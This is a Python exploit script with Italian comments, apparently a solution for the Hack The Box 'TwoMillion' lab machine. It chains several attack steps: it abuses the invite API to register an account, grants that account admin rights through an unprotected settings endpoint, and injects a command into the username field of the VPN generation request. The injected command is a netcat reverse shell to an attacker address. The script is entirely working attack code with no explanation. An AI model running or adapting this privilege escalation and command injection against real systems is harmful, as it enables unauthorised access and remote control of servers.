import requests
import base64
import random
import string

# Configurazione
CHALLENGE_URL = "http://2million.htb"
YOUR_IP = '10.10.16.25'
YOUR_PORT = 9999

# Creazione sessione HTTP
session = requests.Session()

# Fase 1: Ottenere e verificare il codice di invito
invite_response = session.post(f"{CHALLENGE_URL}/api/v1/invite/generate")
invite_code = base64.b64decode(invite_response.json()['data']['code']).decode()

verify_response = session.post(f"{CHALLENGE_URL}/api/v1/invite/verify", data={'code': invite_code})

# Creazione credenziali casuali
def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

username = generate_random_string()
password = generate_random_string()
email = f"{username}@mail.com"

registration_data = {
    'code': invite_code,
    'username': username,
    'email': email,
    'password': password,
    'password_confirmation': password
}

# Registrazione utente
if "code is valid" in verify_response.text:
    register_response = session.post(f"{CHALLENGE_URL}/api/v1/user/register", data=registration_data)
    print(f"Account creato - Email: {email}, Password: {password}")

# Login utente
login_response = session.post(f"{CHALLENGE_URL}/api/v1/user/login", data={'email': email, 'password': password})

# Elevazione privilegi amministrativi
admin_update_response = session.put(f"{CHALLENGE_URL}/api/v1/admin/settings/update",
                                    json={'email': email, 'is_admin': 1})

print("Session Cookies: ", session.cookies.get_dict())

# Generazione reverse shell
reverse_shell_cmd = f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR_IP} {YOUR_PORT} >/tmp/f"

# Esecuzione comando remoto tramite exploit VPN
vpn_exploit_response = session.post(
    f"{CHALLENGE_URL}/api/v1/admin/vpn/generate",
    json={'username': f"x; {reverse_shell_cmd}"},
    proxies={'http': 'http://localhost:8080'}
)
